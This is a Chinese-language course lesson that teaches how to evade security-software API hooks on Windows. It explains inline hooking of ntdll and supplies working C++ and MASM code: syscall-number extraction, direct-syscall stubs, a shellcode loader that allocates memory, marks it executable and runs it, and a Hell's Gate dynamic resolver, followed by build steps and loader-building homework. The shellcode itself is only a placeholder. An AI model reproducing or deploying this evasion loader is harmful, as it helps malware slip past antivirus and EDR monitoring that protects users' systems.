# 课时05：重写R3 API

## 1. 课程概述

### 1.1 学习目标

- 理解Windows API的分层结构
- 掌握API Hook的原理与绕过方法
- 学会重新实现底层系统调用
- 绕过安全软件的API监控

### 1.2 前置知识

- Windows API调用机制
- x86/x64汇编基础
- Syscall概念

---

## 2. 名词解释

### 2.1 核心术语

| 术语 | 说明 |
|------|------|
| **API Hook** | 拦截API调用的技术，常被安全软件使用 |
| **Inline Hook** | 修改函数开头指令的Hook方式 |
| **Syscall** | 系统调用，从用户态进入内核态 |
| **SSN** | System Service Number，系统服务号 |
| **Direct Syscall** | 直接执行syscall指令，跳过ntdll |

### 2.2 API调用层次

```
应用程序
    ↓
kernel32.dll!CreateFileA     ← 可能被Hook
    ↓
kernelbase.dll!CreateFileW   ← 可能被Hook
    ↓
ntdll.dll!NtCreateFile       ← 可能被Hook
    ↓
syscall指令                  ← 进入内核（无法Hook）
    ↓
内核 ntoskrnl.exe
```

---

## 3. 技术原理

### 3.1 安全软件如何Hook API

```原始函数:
ntdll!NtAllocateVirtualMemory:
    4C 8B D1          mov r10, rcx
    B8 18 00 00 00    mov eax, 18h    ; syscall number
    0F 05             syscall
    C3                ret

被Hook后:
ntdll!NtAllocateVirtualMemory:
    E9 XX XX XX XX    jmp SecurityHook  ; 跳转到安全软件
    90                nop
    0F 05             syscall
    C3                ret
```

### 3.2 绕过思路

1. **重新实现ntdll函数**：不使用被Hook的函数
2. **直接Syscall**：跳过ntdll，直接执行syscall
3. **从disk读取干净ntdll**：加载未Hook的副本

---

## 4. 实现代码

### 4.1 获取Syscall Number

```cpp
#include <windows.h>
#include <stdio.h>

// 从ntdll中解析syscall number
DWORD GetSyscallNumber(LPCSTR szFunctionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;
    
    PBYTE pFunc = (PBYTE)GetProcAddress(hNtdll, szFunctionName);
    if (!pFunc) return 0;
    
    // 检查是否被Hook
    // 正常的Nt函数应该以 4C 8B D1 B8 XX XX 00 00 开头
    if (pFunc[0] == 0x4C && pFunc[1] == 0x8B && pFunc[2] == 0xD1) {
        // 未Hook，syscall number在偏移4处
        return *(DWORD*)(pFunc + 4);
    }
    
    // 被Hook了，尝试其他方法获取
    printf("[-] Function may be hooked!\n");
    return 0;
}

int main() {
    printf("========== Syscall Number Extraction ==========\n");
    
    struct {
        LPCSTR name;
        DWORD ssn;
    } functions[] = {
        { "NtAllocateVirtualMemory", 0 },
        { "NtProtectVirtualMemory", 0 },
        { "NtWriteVirtualMemory", 0 },
        { "NtCreateThreadEx", 0 },
        { "NtOpenProcess", 0 },
    };
    
    for (int i = 0; i < sizeof(functions)/sizeof(functions[0]); i++) {
        functions[i].ssn = GetSyscallNumber(functions[i].name);
        printf("%-30s SSN: 0x%X\n", functions[i].name, functions[i].ssn);
    }
    
    return 0;
}
```

### 4.2 直接Syscall实现 (x64)

需要单独的汇编文件 `syscalls.asm`:

```asm
; syscalls.asm - MASM x64
.code

; NtAllocateVirtualMemory syscall
NtAllocateVirtualMemoryDirect proc
    mov r10, rcx
    mov eax, 18h        ; Windows 10 syscall number
    syscall
    ret
NtAllocateVirtualMemoryDirect endp

; NtProtectVirtualMemory syscall
NtProtectVirtualMemoryDirect proc
    mov r10, rcx
    mov eax, 50h        ; Windows 10 syscall number
    syscall
    ret
NtProtectVirtualMemoryDirect endp

; NtWriteVirtualMemory syscall
NtWriteVirtualMemoryDirect proc
    mov r10, rcx
    mov eax, 3Ah        ; Windows 10 syscall number
    syscall
    ret
NtWriteVirtualMemoryDirect endp

; NtCreateThreadEx syscall
NtCreateThreadExDirect proc
    mov r10, rcx
    mov eax, 0C2h       ; Windows 10 syscall number
    syscall
    ret
NtCreateThreadExDirect endp

end
```

### 4.3 C++调用直接Syscall

```cpp
#include <windows.h>
#include <stdio.h>

// 外部汇编函数声明
extern "C" {
    NTSTATUS NtAllocateVirtualMemoryDirect(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
    );
    
    NTSTATUS NtProtectVirtualMemoryDirect(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        PSIZE_T RegionSize,
        ULONG NewProtect,
        PULONG OldProtect
    );
}

unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0x90,  // NOP sled
    0xC3                     // ret
};

int main() {
    printf("========== Direct Syscall ShellCode Loader ==========\n");
    
    PVOID pMemory = NULL;
    SIZE_T size = sizeof(shellcode);
    ULONG oldProtect;
    
    // 使用直接syscall分配内存
    NTSTATUS status = NtAllocateVirtualMemoryDirect(
        GetCurrentProcess(),
        &pMemory,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (status != 0) {
        printf("[-] Allocation failed: 0x%X\n", status);
        return 1;
    }
    
    printf("[+] Memory allocated at: 0x%p\n", pMemory);
    
    // 复制shellcode
    memcpy(pMemory, shellcode, sizeof(shellcode));
    
    // 使用直接syscall修改保护
    SIZE_T regionSize = sizeof(shellcode);
    status = NtProtectVirtualMemoryDirect(
        GetCurrentProcess(),
        &pMemory,
        &regionSize,
        PAGE_EXECUTE_READ,
        &oldProtect
    );
    
    if (status != 0) {
        printf("[-] Protection change failed: 0x%X\n", status);
        return 1;
    }
    
    printf("[+] Protection changed, executing...\n");
    
    // 执行
    ((void(*)())pMemory)();
    
    printf("[+] Done!\n");
    return 0;
}
```

### 4.4 动态Syscall (Hell's Gate技术)

```cpp
#include <windows.h>
#include <stdio.h>

// 动态获取syscall number并执行
typedef struct _SYSCALL_ENTRY {
    DWORD dwHash;      // 函数名哈希
    DWORD dwSSN;       // syscall number
    PVOID pAddress;    // syscall地址
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

// 计算函数名哈希
DWORD HashFunction(LPCSTR szName) {
    DWORD hash = 5381;
    while (*szName) {
        hash = ((hash << 5) + hash) + *szName++;
    }
    return hash;
}

// 从ntdll获取所有Zw/Nt函数的syscall number
BOOL InitializeSyscalls(PSYSCALL_ENTRY entries, DWORD count) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
    
    PIMAGE_EXPORT_DIRECTORY pExports = (PIMAGE_EXPORT_DIRECTORY)(
        (PBYTE)hNtdll + pNt->OptionalHeader.DataDirectory[0].VirtualAddress
    );
    
    PDWORD pNames = (PDWORD)((PBYTE)hNtdll + pExports->AddressOfNames);
    PDWORD pFuncs = (PDWORD)((PBYTE)hNtdll + pExports->AddressOfFunctions);
    PWORD pOrds = (PWORD)((PBYTE)hNtdll + pExports->AddressOfNameOrdinals);
    
    for (DWORD i = 0; i < pExports->NumberOfNames; i++) {
        LPCSTR szName = (LPCSTR)((PBYTE)hNtdll + pNames[i]);
        PBYTE pFunc = (PBYTE)hNtdll + pFuncs[pOrds[i]];
        
        // 只处理Zw/Nt函数
        if ((szName[0] == 'Z' && szName[1] == 'w') ||
            (szName[0] == 'N' && szName[1] == 't')) {
            
            DWORD hash = HashFunction(szName);
            
            // 查找匹配的条目
            for (DWORD j = 0; j < count; j++) {
                if (entries[j].dwHash == hash) {
                    // 提取syscall number
                    if (pFunc[0] == 0x4C && pFunc[1] == 0x8B) {
                        entries[j].dwSSN = *(DWORD*)(pFunc + 4);
                        entries[j].pAddress = pFunc;
                    }
                }
            }
        }
    }
    
    return TRUE;
}
```

---

## 5. 编译说明

### 5.1 MASM编译汇编文件

```bash
# 编译asm文件
ml64 /c /Fo syscalls.obj syscalls.asm

# 编译C++并链接
cl.exe main.cpp syscalls.obj /Fe:loader.exe
```

### 5.2 项目配置

1. 创建Visual Studio项目
2. 添加.asm文件
3. 右键.asm文件 → 属性 → 项类型 → Microsoft Macro Assembler
4. 生成依赖项中添加masm

---

## 6. 课后作业

### 6.1 基础练习

1. 获取当前系统上NtAllocateVirtualMemory的syscall number
2. 实现直接syscall的内存分配

### 6.2 进阶练习

1. 实现动态获取syscall number的加载器
2. 尝试检测ntdll是否被Hook

### 6.3 思考题

1. 不同Windows版本的syscall number如何处理？
2. 安全软件如何检测直接syscall调用？

---

## 7. 下一课预告

下一课我们将学习**“重载NTDLL”**，通过加载未Hook的ntdll副本来绕过检测。
